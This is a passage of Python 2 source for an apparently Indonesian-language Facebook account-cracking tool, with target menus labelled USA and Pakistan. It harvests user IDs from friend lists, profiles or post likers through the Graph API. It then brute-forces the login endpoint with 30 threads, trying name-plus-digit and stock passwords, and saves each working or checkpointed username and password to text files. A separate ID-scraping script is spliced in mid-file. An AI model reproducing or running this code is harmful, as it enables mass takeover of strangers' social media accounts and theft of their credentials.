						oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos2+"\n")
						oke.close()
						oks.append(zowe)
					else:
						if 'www.facebook.com' in ko['error_msg']:
							print ("\n\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} \x1b[1;95mCEKPOINT")
							print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;95m") + j['name']
							print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;95m") + zowe
							print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;95m") + bos2
							cek = open("done/usa.txt", "a")
							cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos2+"\n")
							cek.close()
							cekpoint.append(zowe)
						else:
							bos3 = j['first_name']+'123'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							ko = json.load(data)
							if 'access_token' in ko:
								print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
								print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
								print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
								print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos3
								oke = open("done/usa.txt", "a")
								oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos3+"\n")
								oke.close()
								oks.append(zowe)
							else:
								if 'www.facebook.com' in ko['error_msg']:
									print ("\n\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} \x1b[1;95mCEKPOINT")
									print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;95m") + j['name']
									print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;95m") + zowe
									print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;95m") + bos3
									cek = open("done/usa.txt", "a")
									cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos3+"\n")
									cek.close()
									cekpoint.append(zowe)
								else:
									bos4 = j['first_name']+'1234'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									ko = json.load(data)
									if 'access_token' in ko:
										print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
										print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
										print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
										print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos4
										oke = open("done/usa.txt", "a")
										oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos4+"\n")
										oke.close()
										oks.append(zowe)
									else:
										if 'www.facebook.com' in ko['error_msg']:
											print ("\n\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} \x1b[1;95mCEKPOINT")
											print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;95m") + j['name']
											print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;95m") + zowe
											print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;95m") + bos4
											cek = open("done/usa.txt", "a")
											cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos4+"\n")
											cek.close()
											cekpoint.append(zowe)
										else:
											bos5 = j['first_name']+'12345'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											ko = json.load(data)
											if 'access_token' in ko:
												print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
												print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
												print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
												print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos5
												oke = open("done/usa.txt", "a")
												oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos5+"\n")
												oke.close()
												oks.append(zowe)
											else:
												if 'www.facebook.com' in ko['error_msg']:
													print ("\n\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} \x1b[1;95mCEKPOINT")
													print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;95m") + j['name']
													print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;95m") + zowe
													print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;95m") + bos5
													cek = open("done/usa.txt", "a")
													cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos5+"\n")
													cek.close()
													cekpoint.append(zowe)
																			
		except:
			pass
			
	p = ThreadPool(30)
	p.map(main, id)
	print "\n\033[1;94m──────────────────────────────────────────────────"
	print '\033[1;97m{\033[1;95m●\033[1;97m} \033[1;95mSelesai ...'
	print"\033[1;97m{\033[1;95m●\033[1;97m} \033[1;95mTotal \033[1;92mOK\033[1;97m/\x1b[1;95mCP \033[1;97m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;95m"+str(len(cekpoint))
	print '\033[1;97m{\033[1;95m●\033[1;97m} \033[1;92mOK\033[1;97m/\x1b[1;95mCP \033[1;95mfile tersimpan \033[1;91m: \033[1;92mdone/usa.txt'
	print 50* "\033[1;94m─"
	raw_input("\033[1;97m{<\033[1;95mKembali\033[1;97m>}")
	os.system("python2 cr4ck.py")
	
##### CRACK PAKISTAN #####
def crack_pakis():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;96m[!] \x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		keluar()
	os.system('clear')
	print logo
	print 50* "\033[1;94m─"
	print "\033[1;97m{\033[1;91m01\033[1;97m} Crack Dari Daftar Teman"
	print "\033[1;97m{\033[1;91m02\033[1;97m} Crack Dari Publik/Teman"
	print "\033[1;97m{\033[1;91m03\033[1;97m} Crack Dari File"
	print "\033[1;97m{\033[1;91m00\033[1;97m} Kembali"
	print 50* "\033[1;94m─"
	pilih_pakis()

#### PILIH PAKISTAN ####
def pilih_pakis():
	teak = raw_input("\033[1;91m︻デ═一▸ \033[91m:\033[1;92m ")
	if teak =="":
		print"\033[1;97m{\033[1;91m!\033[1;97m}\033[1;97m Isi Yg Benar !"
		pilih_pakis()
	elif teak =="1" or teak =="01":
		os.system('clear')
		print logo
		print 50* "\033[1;94m─"
		print ("             \033[1;91m●●● \033[1;97mCRACK PAKISTAN \033[1;91m●●●")
		print 50* "\033[1;94m─"
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif teak =="2" or teak =="02":
		os.system('clear')
		print logo
		print 50* "\033[1;94m─"
		print ("             \033[1;91m●●● \033[1;97mCRACK PAKISTAN \033[1;91m●●●")
		print 50* "\033[1;94m─"
		idt = raw_input("\033[1;97m{\033[1;91m●\033[1;97m} \033[1;91mID Publik/Teman \033[1;91m:\033[1;92m ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;97m{\033[1;91m●\033[1;97m} \033[1;91mNama \033[1;91m:\033[1;92m "+op["name"]
		except KeyError:
			print"\033[1;97m{\033[1;91m!\033[1;97m} ID publik/teman tidak ada !"
			raw_input("\n\033[1;91m[\033[1;97m<Kembali>\033[1;91m]")
			crack_pakis()
		except requests.exceptions.ConnectionError:
			print"\033[1;97m{\033[1;91m!\033[1;97m} Tidak ada koneksi !"
			keluar()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif teak =="3" or teak =="03":
		os.system('clear')
		print logo
		try:
			print 50* "\033[1;94m─"
			print ("             \033[1;91m●●● \033[1;97mCRACK PAKISTAN \033[1;91m●●●")
			print 50* "\033[1;94m─"
			idlist = raw_input('\033[1;97m{\033[1;91m●\033[1;97m} \033[1;91mNama File\033[1;91m :\033[1;92m ')
			for line in open(idlist,'r').readlines():
				id.append(line.strip())
		except KeyError:
			print '\033[1;97m{\033[1;91m!\033[1;97m} File tidak ada ! '
			raw_input('\n\033[1;92m[ \033[1;97mKembali \033[1;92m]')
		except IOError:
			print '\033[1;97m{\033[1;91m!\033[1;97m} File tidak ada !'
			raw_input("\n\033[1;91m[\033[1;97m<Kembali>\033[1;91m]")
			crack_pakis()
	elif teak =="0" or teak =="00":
		menu()
	else:
		print"\033[1;97m{\033[1;91m!\033[1;97m}\033[1;97m Isi Yg Benar !"
		pilih_pakis()
	
	print "\033[1;97m{\033[1;91m●\033[1;97m} \033[1;91mTotal ID \033[1;91m:\033[1;92m "+str(len(id))
	print('\033[1;97m{\033[1;91m●\033[1;97m} \033[1;91mStop Tekan CTRL+Z')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;97m{\033[1;91m●\033[1;97m} \033[1;91mCrack Berjalan "+o),;sys.stdout.flush();time.sleep(1)
	print("\n\033[1;97m{\033[1;91m●\033[1;97m} \033[1;91mGunakan Mode Pesawat Jika Tidak Ada Hasil")
	print ("\033[1;94m──────────────────────────────────────────────────")
	
##### MAIN PAKISTAN #####
	def main(arg):
		sys.stdout.write("\r{}".format(datetime.now().strftime("\033[1;96m%H\033[1;91m:\033[1;93m%M\033[1;91m:\033[1;92m%S")));sys.stdout.flush()
		global cekpoint,oks
		zowe = arg
		try:
			os.mkdir('done')
		except OSError:
			pass
		try:
			an = requests.get('https://graph.facebook.com/'+zowe+'/?access_token='+toket)
			j = json.loads(an.text)
			bos1 = j['first_name'].lower()+'123'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			ko = json.load(data)
			if 'access_token' in ko:
				print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
				print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
				print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
				print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos1
				oke = open("done/pakis.txt", "a")
				oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos1+"\n")
				oke.close()
				oks.append(zowe)
			else:
				if 'www.facebook.com' in ko['error_msg']:
					print ("\n\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} \x1b[1;91mCEKPOINT")
					print ("\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;91m") + j['name']
					print ("\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;91m") + zowe
					print ("\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;91m") + bos1
					cek = open("done/pakis.txt", "a")
					cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos1+"\n")
					cek.close()
					cekpoint.append(zowe)
				else:
					bos2 = j['first_name'].lower()+'1234'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					ko = json.load(data)
					if 'access_token' in ko:
						print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
						print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
						print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
						print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos2
						oke = open("done/pakis.txt", "a")
						oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos2+"\n")
						oke.close()
						oks.append(zowe)
					else:
						if 'www.facebook.com' in ko['error_msg']:
							print ("\n\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} \x1b[1;91mCEKPOINT")
							print ("\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;91m") + j['name']
							print ("\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;91m") + zowe
							print ("\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;91m") + bos2
							cek = open("done/pakis.txt", "a")
							cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos2+"\n")
							cek.close()
							cekpoint.append(zowe)
						else:
							bos3 = j['first_name'].lower()+'12345'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							ko = json.load(data)
							if 'access_token' in ko:
								print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
								print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
								print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
								print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos3
								oke = open("done/pakis.txt", "a")
								oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos3+"\n")
								oke.close()
								oks.append(zowe)
							else:
								if 'www.facebook.com' in ko['error_msg']:
									print ("\n\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} \x1b[1;91mCEKPOINT")
									print ("\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;91m") + j['name']
									print ("\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;91m") + zowe
									print ("\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;91m") + bos3
									cek = open("done/pakis.txt", "a")
									cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos3+"\n")
									cek.close()
									cekpoint.append(zowe)
								else:
									bos4 = ('pakistan')
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									ko = json.load(data)
									if 'access_token' in ko:
										print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
										print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
										print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
										print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos4
										oke = open("done/pakis.txt", "a")
										oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos4+"\n")
										oke.close()
										oks.append(zowe)
									else:
										if 'www.facebook.com' in ko['error_msg']:
											print ("\n\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} \x1b[1;91mCEKPOINT")
											print ("\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;91m") + j['name']
											print ("\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;91m") + zowe
											print ("\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;91m") + bos4
											cek = open("done/pakis.txt", "a")
											cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos4+"\n")
											cek.close()
											cekpoint.append(zowe)
										else:
											bos5 = ('786786')
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											ko = json.load(data)
											if 'access_token' in ko:
												print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
												print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
												print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
												print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos5
												oke = open("done/pakis.txt", "a")
												oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos5+"\n")
												oke.close()
												oks.append(zowe)
											else:
												if 'www.facebook.com' in ko['error_msg']:
													print ("\n\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} \x1b[1;91mCEKPOINT")
													print ("\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;91m") + j['name']
													print ("\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;91m") + zowe
													print ("\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;91m") + bos5
													cek = open("done/pakis.txt", "a")
													cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos5+"\n")
													cek.close()
													cekpoint.append(zowe)
												else:
													bos6 = j['last_name'].lower()+'786'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													ko = json.load(data)
													if 'access_token' in ko:
														print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
														print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
														print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
														print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos6
														oke = open("done/pakis.txt", "a")
														oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos6+"\n")
														oke.close()
														oks.append(zowe)
													else:
														if 'www.facebook.com' in ko['error_msg']:
															print ("\n\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} \x1b[1;91mCEKPOINT")
															print ("\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;91m") + j['name']
															print ("\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;91m") + zowe
															print ("\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;91m") + bos6
															cek = open("done/pakis.txt", "a")
															cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos6+"\n")
															cek.close()
															cekpoint.append(zowe)
														else:
															bos7 = j['last_name'].lower()+'123'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															ko = json.load(data)
															if 'access_token' in ko:
																print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
																print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
																print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
																print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos7
																oke = open("done/pakis.txt", "a")
																oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos7+"\n")
																oke.close()
																oks.append(zowe)
															else:
																if 'www.facebook.com' in ko['error_msg']:
																	print ("\n\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} \x1b[1;91mCEKPOINT")
																	print ("\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;91m") + j['name']
																	print ("\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;91m") + zowe
																	print ("\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;91m") + bos7
																	cek = open("done/pakis.txt", "a")
																	cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos7+"\n")
																	cek.close()
																	cekpoint.append(zowe)
																else:
																	bos8 = j['last_name'].lower()+'1234'
																	data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																	ko = json.load(data)
																	if 'access_token' in ko:
																		print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
																		print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
																		print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
																		print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos8
																		oke = open("done/pakis.txt", "a")
																		oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos8+"\n")
																		oke.close()
																		oks.append(zowe)
																	else:
																		if 'www.facebook.com' in ko['error_msg']:
																			print ("\n\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} \x1b[1;93mCEKPOINT")
																			print ("\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;91m") + j['name']
																			print ("\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;91m") + zowe
																			print ("\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;91m") + bos8
																			cek = open("done/pakis.txt", "a")
																			cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos8+"\n")
																			cek.close()
																			cekpoint.append(zowe)
																			
		except:
			pass
			
	p = ThreadPool(30)
	p.map(main, id)
	print "\n\033[1;94m──────────────────────────────────────────────────"
	print '\033[1;97m{\033[1;91m●\033[1;97m} \033[1;91mSelesai ...'
	print"\033[1;97m{\033[1;91m●\033[1;97m} \033[1;91mTotal \033[1;92mOK\033[1;97m/\x1b[1;91mCP \033[1;97m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;91m"+str(len(cekpoint))
	print '\033[1;97m{\033[1;91m●\033[1;97m} \033[1;92mOK\033[1;97m/\x1b[1;91mCP \033[1;91mfile tersimpan \033[1;91m: \033[1;92mdone/pakis.txt'
	print 50* "\033[1;94m─"
	raw_input("\033[1;97m{<\033[1;91mKembali\033[1;97m>}")
	os.system("python2 cr4ck.py")
	
####### PILIH AMBIL ID #######
# Coding by fb.com/Rizky.Rasata
# Python2
import requests,os,re

baner = """ _____ _           _   ___ ____    _____ ____
|  ___(_)_ __   __| | |_ _|  _ \  |  ___| __ )
| |_  | | '_ \ / _` |  | || | | | | |_  |  _ \

|  _| | | | | | (_| |  | || |_| | |  _| | |_) |
|_|   |_|_| |_|\__,_| |___|____/  |_|   |____/\n
\033[0;93m[\033[0;93m ⚘ \033[0;93m] SEBELUM CRACK AMBIL ID DULU GAN
\033[0;93m[\033[0;93m ⚘ \033[0;93m] MASUKIN USERNAME CONTOH (www.facebook.com/itsme.PANGLIMA.ILHAM ) """

try:
 os.system('clear')
 print baner
 u = raw_input('Masukkan username > ')
 url = 'https://www.facebook.com/'+u
 r = requests.get(url).text
 name = re.search('Title">(.*?)</', r).group(1).strip('| Facebook')
 id = re.search('profile/(.*?)" ', r).group(1)

 print '\nNAMA > '+name
 print 'ID   > '+id+'\n'
 
except requests.exceptions.ConnectionError:
 	print 'Koneksi tidak ada'
except AttributeError:
	print 'Username tidak di temukan'


	
##### CRACK LIKES #####
def crack_likes():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;97m[!] Token invalid"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	try:
		os.system('clear')
		print logo
		print 50* "\033[1;94m─"
		print ("        \033[1;96m●●● \033[1;97mCRACK POSTINGAN GRUP/TEMAN\033[1;96m ●●●")
		print 50* "\033[1;94m─"
		tez = raw_input("\033[1;97m{\033[1;96m●\033[1;97m}\033[1;96m ID Postingan Group/Teman \033[1;91m :\033[1;92m ")
		r = requests.get("https://graph.facebook.com/"+tez+"/likes?limit=9999999&access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
		jalan('\r\033[1;97m{\033[1;96m●\033[1;97m} \033[1;96mMengambil ID \033[1;97m...')
	except KeyError:
		print"\033[1;97m{\033[1;91m!\033[1;97m} ID Postingan Salah !"
		raw_input("\n\033[1;96m[<\033[1;97mKembali>\033[1;96m]")
		menu()
		
	print "\033[1;97m{\033[1;96m●\033[1;97m} \033[1;96mTotal ID \033[1;91m:\033[1;92m "+str(len(id))
	print('\033[1;97m{\033[1;96m●\033[1;97m} \033[1;96mStop Tekan CTRL+Z')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;97m{\033[1;96m●\033[1;97m} \033[1;96mCrack Berjalan "+o),;sys.stdout.flush();time.sleep(1)
	print("\n\033[1;97m{\033[1;96m●\033[1;97m} \033[1;96mGunakan Mode Pesawat Jika Tidak Ada Hasil")
